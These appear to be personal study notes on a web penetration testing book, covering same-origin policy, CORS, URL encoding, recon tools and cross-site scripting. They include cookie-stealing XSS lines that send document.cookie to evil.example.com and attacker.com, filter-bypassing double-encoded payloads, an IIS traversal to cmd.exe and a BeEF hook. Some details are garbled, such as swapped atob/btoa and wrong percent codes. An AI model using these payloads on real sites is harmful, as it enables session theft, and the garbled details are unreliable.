Mastering modern web penetration testing=Prakhar Prasad;Note=Erxin


# Preface 
- example code 
https://github.com/PacktPublishing/Mastering-Modern-Web-Penetration-Testing


# Common security protocols 
- same origin policy (SOP)

- switching origins 

The document.domain property allows the origin of the current page to change into a different origin

- quirks with internet explorer 

http://example.com:8081 and http://example.com:8000 will be considered as the same origin

- cross-domain messaging 

the postMessage() method, which allows sending messages or data across different origins

window.addEventListener('message',function(event) {
  if(event.origin != 'http://sender.com') return;
  console.log('Received:  ' + event.data,event);
  },false);

- ajax and the same-origin policy 

- cors, content delivery netwokrs provide resource-hosting functionality and allow any website or origin to interact with themselves 

    + cors headers 
    
    Access-Control-Allow-Origin 
    
    Access-Control-Allow-Methods, allows GET/POST etc. 

    the server responds with a header that tells the browser whether the origin of the request is listed inside the value of this response.

    + origin, this is a request header which tells the server from which domain origin the request was attempted 
    
- pre-flight request 

custom HTTP headers are sent 

the body MIME type is different that text/plain 

the HTTP method is different thant GET or POST 

- url encoding 

OAuth also require some of its parameters, such as redirect_uri, to be percent encoded to make it distinct from rest of the URL for the browser.

    + unrestricted characters 

A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
a b c d e f g h i j k l m n o p q r s t u v w x y z
0 1 2 3 4 5 6 7 8 9 - _ . ~

    + restricted characters 
!	*	'	(	)	;	:	@	&	=	+	$	,	/	?	#	[	]

http://meyerweb.com/eric/tools/dencoder/

    + encode characters 
    
Character
	

Encoded

: %3A
/ %2F
# %23
? %3F
& %24
@ %40
% %25
+ %2B
<space> %20
; %3B
= %3D
$ %26
, %2C
< %3C
> %3E
^ %5E
` %60
\ %5C
[ %5B
] %5D
{ %7B
} %7D
| %7C
" %22 

- A vulnerability that could enable an attacker to run operating system commands on an affected server


- Double encoding, Double percent encoding is the same as percent encoding with a twist that each character is encoded twice instead of once. sometimes works well in Local File Inclusion (LFI) or Remote File Inclusion (RFI) scenarios as well

http://example.com/scripts/../../winnt/system32/cmd.exe?/c+dir+c:\


Normal URL: http://www.example.com/derp/one/more/time.html

Percent encoded: http%3A%2F%2Fwww.example.com%2Fderp%2Fone%2Fmore%2Ftime.html

Double encoded: http%253A%252F%252Fwww.example.com%252Fderp%252Fone%252Fmore%252Ftime.html

makes the mistake of decoding it multiple times or situations in which this happens by design.

IIS 5.0 directory traversal code execution – CVE-2001-0333

double-encoded URL 
http://example.com/scripts/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

    + Original request with XSS payload (blocked): http://www.example.com/search.php?q=<script>alert(0)</script>

    + Percent-encoded XSS payload (blocked):

    http://www.example.com/search.php?q=%3Cscript%3Ealert(0)%3C%2Fscript%3E

    + Double-percent-encoded payload (allowed): http://www.example.com/search.php?q=%253Cscript%253Ealert(0)%253C%252Fscript%253E

    encodeURI(encodeURI("http://www.example.com/search.php?q=<script>alert(0)</script>"))

- base64 encoding 

    atob(): Encode to Base64
    bota(): Decode from Base64

    + padding 
    = is appended in place of that


# Information gathering 
- recon tools will be discussed:

Fierce
theHarvester
SubBrute
CeWL – Custom Word List Generator
DirBuster
WhatWeb
Maltego

-  passive enumeration:

Wolfram Alpha
Shodan
DNSdumpster
Reverse IP Lookup using YouGetSignal
Pentest-Tools
Google Advanced Search


- Fierce is an open source active recon tool to enumerate sub domains of a target website. 

$ fierce -dns target.com 

- theHarvester is an open source reconnaissance tool, it can dig out heaps of information, comprising of subdomains, email addresses, employee names, open ports, and so on.

- SubBrute

SubBrute is an open source subdomain enumeration tool.

- CeWL

CeWL is a custom wordlist generator made by Robin Hood. It basically spiders the target site to a certain depth and then returns a list of words

Kali Linux but can be downloaded from https://digi.ninja/projects/cewl.php#download.

- DirBuster

DirBuster is a file/directory brute-forcer. It's written in Java and programmed by the members of the OWASP community. It's a GUI application and comes with Kali Linux.

DirBuster project: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project.

- We can use WhatWeb, which is an active recon tool, to get basic information about a website.

- Maltego

Maltego is an Open-Source Intelligence (OSINT) tool developed by Paterva. It's a commercial tool, however the community edition comes by default alongside Kali Linux.

- Wolfram Alpha

Wolfram Alpha is a knowledge engine, which provides services like computation, analysis, and so on using an AI-based search interface

- Shodan

Before I begin, I must say Shodan is a one-of-a-kind search engine. In their own words, it is the world's first computer search engine, often dubbed as the search engine for hackers. 

Shodan provides a very decent and useful way to filter our result by the following criterion:

TOP COUNTRIES
TOP SERVICES
TOP ORGANIZATIONS
TOP OPERATING SYSTEMS
TOP PRODUCTS

- recommend the website http://www.routerpasswords.com/ for looking up default login credentials

- DNSdumpster, DNSdumpster (https://dnsdumpster.com/) is yet another passive subdomain enumeration

- YouGetSignal (http://www.yougetsignal.com/) is a website that provides a reverse IP lookup feature. In layman's terms, the website will try to obtain the IP address for every hostname entered and then it will do a reverse IP lookup on it, so it will discover other hostnames that are associated with that particular IP.

- Pentest-Tools (https://pentest-tools.com/home) gives a good set of web-based tools to facilitate in passive information gathering, web application testing, and network testing

- google advanced search 

looking for backup.sql anywhere in the result, but the content of the result must contain the keyword SELECT, the extension will be SQL

Google search operators. (Source: http://damilarefagbemi.com/):


# Cross-site scripting 
- following topics in this chapter, cross-site scripting is the most popular web vulnerability

    Reflected XSS
    Stored XSS
    Flash-based XSS
    HttpOnly cookies
    DOM-based XSS

- reflected XSS, the application takes one or more parameters as an input, which is reflected back to the web page generated by the application

session or other essential cookies of the user are available to be stolen through the document.cookie

```
window.location='http://evil.example.com/?cookie='+document.cookie
```
if executed on a browser, will transfer all the cookies that fall under the origin of the webpage to evil.example.com as soon as it gets loaded.

cookies marked with HttpOnly will not be transferred as this acts as a defensive measure to prevent marked cookies from being accessed through document.cookie.

    + inserting the following piece of HTML which consist of characters that are generally used in building an XSS payload
    
"'<>();[]{}AbC

    + case study 1, execute the XSS in the anchor tag's href using the javascript: URI handler
    
<a href="javascript:alert('myxssruns')">Click Me</a>
    
document.write('<imgsrc="https://attacker.com/steal.gif?cookie=' + document.cookie + '" />')

- reflected XSS case study 2, Every thing is normal, except for the fact that the content type returned by web server will be text/html or similar

https://api.vineapp.com/users/search/nameoftheuser

https://api.vineapp.com/users/search/"><imgsrc=x onerror=alert(1);

    + case 2, APIs provided by web server. Some of the endpoints often reflect the values we provide into parameters such as the JSONP callback
    
    https://api.vineapp.com/users/search/"><imgsrc=x onerror=alert(1);

    The problem begins when the server returned the Content-Type header with the text/html value set. This simply instructs the browser to load the response as a normal HTML webpage. 
    
    This scenario quickly escalated to XSS since two conditions were fulfilled; 
    the first one involved being an input that loads our XSS payload through a link and then it is reflected in the response, and 
    the second that the response is rendered as a fully-fledged XSS vector.

    https://whitton.io/articles/content-types-and-xss-facebook-studio/

- stored XSS 

if we insert an XSS payload as depicted in the previous image, we can execute it persistently as many times as the guestbook loads

- The format is described by its founder John Gruber and can be looked at here: https://daringfireball.net/projects/markdown/syntax.

[Hi](http://prakharprasad.com)

<a href="http://prakharprasad.com">Hi</a>

[Hi](javascript:alert(1);)

- stored XSS through APIs 

Slack (https://slack.com/) is a real-time messaging and collaboration website

The API method to send messages was chat.postMessage. The API allowed me to specify a username as well as the messages. The basic structure of the API call parameter was as follows

```
mg src=x onerr=alert(document.cookie)
```

I'm inserting the XSS vector in the username field of the API call, which will execute an alert box with document.cookie

- stored XSS through spoofed IP address 

we can make use of an HTTP header known as X-Forwarded-For. This header is generated by HTTP proxies

This image is taken from http://www.oxpedia.org, which explains how the X-Forwarded-For header works.

X-Forwarded-For. This header is generated by HTTP proxies, which send back the original IP address of the client computers to the upstream website server

https://slack.com/; there was an interface for the administrators of a team to view the IP address

I intentionally inserted an X-Forwarded-For header with a XSS payload inside it as a value:

- flash based xss externalinterface.call()

ExternalInterface.call() thing, you might wonder. Simply speaking, it's an ActionScript (which complies with Flash) function 

- HttpOnly and secure cookie flags, HttpOnly is a flag attached to cookies that instruct the browser not to expose the cookie through client-side scripts

```
Set-Cookie: Name=Value; expires=Wednesday, 01-May-2014 12:45:10 GMT; HttpOnly
```

an encrypted channel such as HTTPS, which prevents eavesdropping, when an HTTPS connection is downgraded to HTTP through tools such as SSLStrip and so on.

```
Set-Cookie: Name=Value; expires=Wednesday, 01-May-2014 12:45:10 GMT; Secure
```

- DOM-based XSS, DOM-based XSS differs from other XSS by the fact that the XSS occurs by the execution of user-supplied input on the DOM of the browser instead of normally sneaking into the HTML

```
<html>
    <head>
        <title>DOM-based XSS</title>
    </head>
    <body>
    <script>
        name = location.hash.substring(1);
        document.write("<b>Hey "+unescape(name)+"! Nice to meet you</b>");
        </script>
    </body>
</html>
```
    + Common sinks that cause DOM-based XSS
    
eval 

Function

setTimeout 

setInterval 

execScript 

crypto.generateCRMFRequest 

ScriptElement.src 

ScriptElement.text 

ScriptElement.textContent 

ScriptElement.innerText

anyTag.onEventName

    + DOM based XSS sinks 
    
element.add 
element.append 
element.after 
element.before 
element.html 
element.prepend 
element.replaceWith 
element.wrap 
element.wrapAll

- XSS exploitation, The BeEF, The BeEF (Browser Exploitation Framework) is an XSS exploitation tool that promises to take over a victim's browser session as a part of the exploitation

BeEF comes preinstalled in Kali Linux 2.0 and we'll use the same. Otherwise you can download BeEF from the project's website at https://beefproject.com/.

The hook (exploitation payload) of BeEF is available at http://0.0.0.0:3000/hook.js.

We'll use a simple JS payload for executing the hook.js payload:

<script src="http://192.168.50.2:3000/hook.js"></script>

- summary 

 further expanding their knowledge of XSS:

http://html5sec.org
https://code.google.com/archive/p/domxsswiki/wikis/Introduction.wiki
https://www.blueclosure.com/


# Cross-Site Request Forgery
- 




































